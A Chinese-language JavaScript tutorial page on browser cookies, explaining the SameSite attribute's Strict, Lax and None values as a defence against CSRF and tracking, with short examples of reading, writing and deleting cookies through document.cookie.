-<h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p>Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来防止 CSRF 攻击和用户追踪。</p>
-<p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站<code>your-bank.com</code>，银行服务器发来了一个 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:id&#x3D;a3fWa;</span><br></pre></td></tr></table></figure>
-
-<p>用户后来又访问了恶意网站<code>malicious.com</code>，上面有一个表单。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是真实请求。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;dad3weg34&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这种第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;facebook.com&quot; style&#x3D;&quot;visibility:hidden;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。</p>
-<p>Cookie 的<code>SameSite</code>属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。</p>
-<blockquote>
-<ul>
-<li>Strict</li>
-<li>Lax</li>
-<li>None</li>
-</ul>
-</blockquote>
-<p><strong>（1）Strict</strong></p>
-<p><code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Strict;</span><br></pre></td></tr></table></figure>
-
-<p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
-<p><strong>（2）Lax</strong></p>
-<p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Lax;</span><br></pre></td></tr></table></figure>
-
-<p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。</p>
-<table>
-<thead>
-<tr>
-<th align="left">请求类型</th>
-<th align="center">示例</th>
-<th align="right">正常情况</th>
-<th align="left">Lax</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">链接</td>
-<td align="center"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">发送 Cookie</td>
-</tr>
-<tr>
-<td align="left">预加载</td>
-<td align="center"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">发送 Cookie</td>
-</tr>
-<tr>
-<td align="left">GET 表单</td>
-<td align="center"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">发送 Cookie</td>
-</tr>
-<tr>
-<td align="left">POST 表单</td>
-<td align="center"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">不发送</td>
-</tr>
-<tr>
-<td align="left">iframe</td>
-<td align="center"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">不发送</td>
-</tr>
-<tr>
-<td align="left">AJAX</td>
-<td align="center"><code>$.get(&quot;...&quot;)</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">不发送</td>
-</tr>
-<tr>
-<td align="left">Image</td>
-<td align="center"><code>&lt;img src=&quot;...&quot;&gt;</code></td>
-<td align="right">发送 Cookie</td>
-<td align="left">不发送</td>
-</tr>
-</tbody></table>
-<p>设置了<code>Strict</code>或<code>Lax</code>以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。</p>
-<p><strong>（3）None</strong></p>
-<p>Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p>
-<p>下面的设置无效。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None</span><br></pre></td></tr></table></figure>
-
-<p>下面的设置有效。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: widget_session&#x3D;abc123; SameSite&#x3D;None; Secure</span><br></pre></td></tr></table></figure>
-
-<h2 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h2><p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
-<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x2F;&#x2F; &quot;foo&#x3D;bar;baz&#x3D;bar&quot;</span><br></pre></td></tr></table></figure>
-
-<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var cookies &#x3D; document.cookie.split(&#39;;&#39;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">  console.log(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; foo&#x3D;bar</span><br><span class="line">&#x2F;&#x2F; baz&#x3D;bar</span><br></pre></td></tr></table></figure>
-
-<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14&#39;;</span><br></pre></td></tr></table></figure>
-
-<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
-<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;test1&#x3D;hello&#39;;</span><br><span class="line">document.cookie &#x3D; &#39;test2&#x3D;world&#39;;</span><br><span class="line">document.cookie</span><br><span class="line">&#x2F;&#x2F; test1&#x3D;hello;test2&#x3D;world</span><br></pre></td></tr></table></figure>
-
-<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
-<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &quot;foo&#x3D;bar; expires&#x3D;Fri, 31 Dec 2020 23:59:59 GMT&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
-<p>各个属性的写入注意点如下。</p>
-<ul>
-<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
-<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
-<li><code>max-age</code>属性的值为秒数。</li>
-<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
-</ul>
-<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;14; &#39;</span><br><span class="line">  + &#39;expires&#x3D;&#39; + someDate.toGMTString() + &#39;; &#39;</span><br><span class="line">  + &#39;path&#x3D;&#x2F;subdirectory; &#39;</span><br><span class="line">  + &#39;domain&#x3D;*.example.com&#39;;</span><br></pre></td></tr></table></figure>
-
-<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
-<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie &#x3D; &#39;fontSize&#x3D;;expires&#x3D;Thu, 01-Jan-1970 00:00:01 GMT&#39;;</span><br></pre></td></tr></table></figure>
-
-<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a>, by MDN</li>
-<li><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/">Using the Same-Site Cookie Attribute to Prevent CSRF Attacks</a></li>
-<li><a target="_blank" rel="noopener" href="https://web.dev/samesite-cookies-explained">SameSite cookies explained</a></li>
-<li><a target="_blank" rel="noopener" href="https://scotthelme.co.uk/tough-cookies/">Tough Cookies</a>, Scott Helme</li>
-<li><a target="_blank" rel="noopener" href="https://scotthelme.co.uk/csrf-is-dead/">Cross-Site Request Forgery is dead!</a>, Scott Helme</li>
-</ul>
-</details>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">DolphinHome</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/4.Cookie/">http://dolphinhome.gitee.io/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/4.Cookie/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dolphinhome.gitee.io" target="_blank">DolphinHome的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/07/29/hv9BJjsmyPwnA5Q.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><button class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.png" alt="wechat" onclick="window.open('/img/wechat.png')"/><div class="post-qr-code__desc">wechat</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.png" alt="alipay" onclick="window.open('/img/alipay.png')"/><div class="post-qr-code__desc">alipay</div></li></ul></div></button></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/3.Navigator%20%E5%AF%B9%E8%B1%A1%EF%BC%8CScreen%20%E5%AF%B9%E8%B1%A1%E3%80%82/"><img class="prev-cover" data-src="https://i.loli.net/2020/05/01/IuWi8QbHvzjlOPw.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">10.3 Navigator 对象，Screen 对象。</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/01/JavaScript/10.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/6.%E5%90%8C%E6%BA%90%E9%99%90%E5%88%B6/"><img class="next-cover" data-src="https://i.loli.net/2020/07/29/Ca9Mic3WNS7pr1q.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">10.6 同源限制</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/1.入门篇/1.导论/" title="1.1 导论"><img class="relatedPosts_cover" data-src="https://gitee.com/dolphinhome/picture_bed/raw/master/11.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">1.1 导论</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/10.浏览器模型/11.ArrayBuffer 对象，Blob 对象/" title="10.11 ArrayBuffer 对象，Blob 对象"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/IuWi8QbHvzjlOPw.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">10.11 ArrayBuffer 对象，Blob 对象</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/10.浏览器模型/12.File 对象，FileList 对象，FileReader 对象/" title="10.12 File 对象，FileList 对象，FileReader 对象"><img class="relatedPosts_cover" data-src="https://gitee.com/dolphinhome/picture_bed/raw/master/10.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">10.12 File 对象，FileList 对象，FileReader 对象</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/10.浏览器模型/15.Web Worker/" title="10.15 Web Worker"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/07/29/IxdrJlmEbausozQ.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">10.15 Web Worker</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/10.浏览器模型/3.Navigator 对象，Screen 对象。/" title="10.3 Navigator 对象，Screen 对象。"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/IuWi8QbHvzjlOPw.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">10.3 Navigator 对象，Screen 对象。</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/01/JavaScript/10.浏览器模型/6.同源限制/" title="10.6 同源限制"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/07/29/Ca9Mic3WNS7pr1q.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-01</div><div class="relatedPosts_title">10.6 同源限制</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By DolphinHome</div><div class="framework-info"><span>驱动 </span><a target="_blank" rel="noopener" href="https://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" title="缩小字体"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="简繁转换">繁</button><button id="darkmode" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
- <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/search/local-search.js"></script></body></html>
